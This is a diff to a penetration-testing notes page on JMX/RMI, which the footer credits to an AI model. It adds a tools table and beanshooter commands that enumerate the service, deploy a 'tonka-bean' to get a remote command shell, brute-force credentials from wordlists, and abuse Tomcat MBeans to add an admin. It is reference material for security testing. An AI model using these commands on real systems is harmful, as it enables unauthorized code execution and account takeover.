@@ -1,3 +1,5 @@
+# JMX
+
 #JMX #JavaManagementExtensions #Java #RMI #RCE #webservices
 
 ## What is JMX?
@@ -7,6 +9,21 @@ Java Management Extensions — Java framework for monitoring and management. Use
 - Port: **TCP 1098** — RMI object port
 - Alternate: 7199 (Cassandra JMX), 9999, 11099 — varies by app
 - Authentication: optional (often disabled)
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | `rmi-dumpregistry`, `rmi-vuln-classloader`, version detection |
+| [[Tools/Web/beanshooter\|beanshooter]] | **Primary** JMX enum + attack (enum/deploy/invoke/serial/mlet, tonka-bean shell) |
+| [[Tools/Web/remote-method-guesser\|remote-method-guesser]] | RMI enumeration + deserialization/method-guessing (`rmg`) |
+| [[Tools/Web/jmxterm\|jmxterm]] | Scriptable CLI JMX client — browse/invoke MBeans |
+| [[Tools/Web/jconsole\|jconsole]] | JDK GUI client — browse MBeans/attributes interactively |
+| [[Tools/Web/mjet\|mjet]] | MOGWAI MLet remote-class-loading exploit |
+| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Java gadget-chain payloads for RMI/JMX deserialization |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `java_rmi_server` deserialization exploit |
 
 ---
 
@@ -46,6 +63,27 @@ jconsole -J-Djava.class.path=jconsole.jar <target>:1099
 ---
 
 ## Attack Vectors
+
+### beanshooter — enumerate + exploit (start here)
+
+[[Tools/Web/beanshooter|beanshooter]] (qtc-de) is the modern one-stop JMX tool — it enumerates known-vulnerable MBeans, brute-forces creds, deploys its own **tonka-bean** for a command shell, and handles MLet loading and deserialization. Prefer it over hand-rolling the MLet chain below.
+
+```bash
+# Enumerate the JMX service for common vulnerabilities / accessible MBeans
+beanshooter enum <target> 1099
+
+# Deploy the tonka-bean (bundled) and run commands (its own MLet stager)
+beanshooter tonka <target> 1099 exec "id"
+beanshooter tonka <target> 1099 shell            # interactive command shell
+
+# Brute-force JMX credentials if auth is on
+beanshooter brute <target> 1099 --username-file users.txt --password-file pass.txt
+
+# App-specific abuse (e.g. Tomcat's MemoryUserDatabaseMBean to add an admin, or DiagnosticCommand)
+beanshooter standard <target> 1099            # dump the interesting standard MBeans
+```
+
+beanshooter also speaks **Jolokia** (HTTP-exposed JMX) — useful when JMX is reachable over `/jolokia` rather than raw RMI.
 
 ### MLet Attack (Remote Class Loading → RCE)
 
@@ -139,7 +177,8 @@ nodetool -h <target> -p 7199 describecluster
 
 | Setting | Risk |
 |---|---|
-| No JMX authentication | Full MBean access → RCE via MLet |
+| No JMX authentication | Full MBean access → RCE via MLet / tonka-bean |
+| Jolokia endpoint exposed (`/jolokia`) | HTTP-reachable JMX — same MBean abuse without RMI |
 | RMI registry exposed to network | Remote class loading |
 | Old JVM version | Deserialization gadget chains |
 | MLet available without auth | Direct remote class loading |
@@ -152,6 +191,7 @@ nodetool -h <target> -p 7199 describecluster
 | Goal | Command |
 |---|---|
 | Detect | `nmap -p 1099 -sV host` |
+| Enum + exploit | `beanshooter enum host 1099` → `beanshooter tonka host 1099 shell` |
 | RMI registry dump | `nmap -p 1099 --script rmi-dumpregistry host` |
 | Connect (GUI) | `jconsole host:1099` |
 | Connect (CLI) | `java -jar jmxterm.jar` → `open host:1099` |
@@ -166,5 +206,5 @@ nodetool -h <target> -p 7199 describecluster
 ---
 
 *Created: 2026-07-13*
-*Updated: 2026-09-22*
+*Updated: 2026-09-25*
 *Model: claude-opus-4-8*
